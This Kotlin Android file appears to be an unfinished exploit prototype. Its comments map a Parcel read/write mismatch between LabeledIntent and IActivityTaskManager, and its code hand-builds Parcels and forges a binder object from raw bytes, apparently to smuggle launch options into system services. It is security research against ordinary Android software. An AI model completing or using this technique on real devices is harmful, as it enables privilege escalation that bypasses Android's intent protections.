package play.ground

import android.app.ActivityOptions
import android.content.Intent.FLAG_ACTIVITY_NEW_TASK
import android.os.Bundle
import android.os.Parcel
import android.util.Log
import androidx.appcompat.app.AppCompatActivity
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.launch
import org.jetbrains.anko.button
import org.jetbrains.anko.sdk27.coroutines.onClick
import org.jetbrains.anko.verticalLayout
import java.nio.ByteBuffer

fun UInt.repeat(n: Int) = UByteArray(n) { this.toUByte() }

class IndexActivity : AppCompatActivity() {
  companion object {
    private const val TAG = "Decay"
  }


  override fun onCreate(savedInstanceState: Bundle?) {
    super.onCreate(savedInstanceState)
    verticalLayout {
      button("Caption") {
        onClick {
          launch(Dispatchers.IO) {
//            obfuscation()
            binder()
          }
        }
      }
    }
  }


  fun obfuscation() {/* reader side (https://cs.android.com/android/platform/superproject/main/+/refs/heads/main:out/soong/.intermediates/frameworks/base/framework-minus-apex-intdefs/android_common/xref36/srcjars.xref/android/app/IActivityTaskManager.java;drc=3fa083f29412adcfbc1138c26e7d641d68960d78;l=868)

    ```java
    resolvedType = data.readString()  //  mSourcePackage ->
    resultTo = data.readStrongBinder() // mLabelRes ->

    resultWho = data.readString() // `1@i32` &  (?? 00 00 00) (which also represent the size of the next string)

    ?? 00 00 00,  -> padding will not be validated per [readInplace](https://cs.android.com/android/platform/superproject/main/+/refs/heads/main:frameworks/native/libs/binder/Parcel.cpp;drc=0e31b87a60843c10ec92e1a7045ee84dd05ae94e;l=1820)
    but the terminate sign will

    the ?? will also be the size of next string


    requestCode = data.readInt()      ->    `0@i32` // first 4 payloads of string8
    flags = data.readInt()            ->    `0@i32` // second 4 payloads of string8
    profilerInfo = data.readTypedObject(android.app.ProfilerInfo.CREATOR) -> `0@i32` // third 4 payloads of string8

    // remaining payload of string8 +  + 0@i32 + (...) +  options => new Options { launchTaskId = ?, ???}
    options = data.readTypedObject(android.os.Bundle.CREATOR)     { android.activity.launchTaskId -> 100@i32}
    data.enforceNoDataAvail()
    ```
    */

    /* writer side of `LabeledIntent`
    ```java
      dest.writeString(mSourcePackage); (String -> resolvedType)
      dest.writeInt(mLabelRes); ( 0 -> resultTo -> binder.hdr) -> B_PACK_CHARS('s', 'b','*', 0x85)

      // mNonLocalizedLabel (case 1)
      {
      val kind = readInt() -> binder.flags => 19 (dummy 19), [0x19000000]
      val string = readString8()  // (binder | handler) @u64 => [0x00000000, 0x00000000]
      val kind = readInt() // first byte of cookie (0) => []
      }

      // mNonLocalizedLabel (case 2)
      {
      val kind = readInt() // binder.flags = 1 =
      val cs = readString8() [binder(len@i32, ?), cookie(?, ?), representation(i32),
            ,
            ,
            string, int, int, null,
            start-of-bundle, ...  ,  ,nil, padding ]
      }

      key =>
        "foobar"

      value =>
        dest.writeInt(mIcon)            // 4 (0)

        dest.writeString(resolvedType)  // 4 (-1)
        dest.writeStrongBinder(7 * 4)   // 28 resultTo
        dest.writeString(resultWho)     // 4 (0xFFFFFFFF)
        dest.writeInt(requestCode)      // 4 (0)
        dest.writeInt(flags)            // 4 (0)
        dest.writeParcelable(null)      // 4 (0) profilerInfo
        dest.writeParcelable(null)      // 4 (0) options
     ```
    */

    /* TextUtil.writeToParcel
      p.writeInt(1)
      p.writeString8(string)
     */


    /* writer side (https://cs.android.com/android/platform/superproject/main/+/refs/heads/main:out/soong/.intermediates/frameworks/base/framework-minus-apex-intdefs/android_common/xref36/srcjars.xref/android/app/IActivityTaskManager.java;drc=3fa083f29412adcfbc1138c26e7d641d68960d78;l=2043)
    ```java
      data.writeString(resolvedType);
      data.writeStrongBinder(resultTo);
      data.writeString(resultWho);
      data.writeInt(requestCode);
      data.writeInt(flags);
      data.writeTypedObject(profilerInfo, 0);
      data.writeTypedObject(options, 0);
     ```
     */

    val ceiling = Parcel.obtain().apply {

    }

    val middle = Parcel.obtain().apply {
      val mIcon = 0
      writeInt(mIcon)

      val resolvedType = null
      writeString(resolvedType)

      val resultTo = null
      writeStrongBinder(resultTo)

      val resultWho = null
      writeString(resultWho)

      val requestCode = -1
      writeInt(requestCode)

      val flags = FLAG_ACTIVITY_NEW_TASK
      writeInt(flags)

      val profilerInfo = null
      writeTypedObject(profilerInfo, 0)
      val options = ActivityOptions.makeBasic().toBundle()
      writeTypedObject(options, 0)
    }

    Log.e(TAG, "${middle.dataPosition()} == 260")


    val floor = Parcel.obtain().apply {
      val mIcon = 0 // LabeledIntent.mIcon
      writeInt(mIcon)

      val resolvedType = null
      writeString(resolvedType)

      val resultTo = null
      writeStrongBinder(resultTo)

      val resultWho = null
      writeString(resultWho)

      val requestCode = 2 // 如果把 `resultTo` 改成 null, requestCode 需要为 -1
      writeInt(requestCode)

      val flags = 0 // 0x10000000 NEW_TASK
      writeInt(flags)

      val profilerInfo = null
      writeTypedObject(profilerInfo, 0)

      val bundle = null
      writeTypedObject(bundle, 0)
    }
    Log.e(TAG, "floor: size: ${floor.dataPosition()} == 56")
  }


  fun binder() {
    val binderHead = ubyteArrayOf(
//      1u, 0u, 0u, 0u, // Span.type(1) -> binder.flags
      3u, 2u, 1u, 0u // String.length(?) -> binder.1@i32
    )

    val binderTail = ubyteArrayOf(
      0u, 0u, 0u, 0u, // Span.str.payload.0123 -> binder.2@i32
      *0u.repeat(8), // Span.str.payload.4567_8901 ->  cookie@i64
      *0u.repeat(4), // Span.str.payload2.2345 -> representation
    )


    val parcel = Parcel.obtain()
    parcel.writeByteArray((binderHead + binderTail).toByteArray())
    parcel.setDataPosition(0)
    val binder = parcel.readStrongBinder()
    Log.e(TAG, "binder: $binder")

  }


  // key =>
  // (260 header) + bytes = > form to entry


}



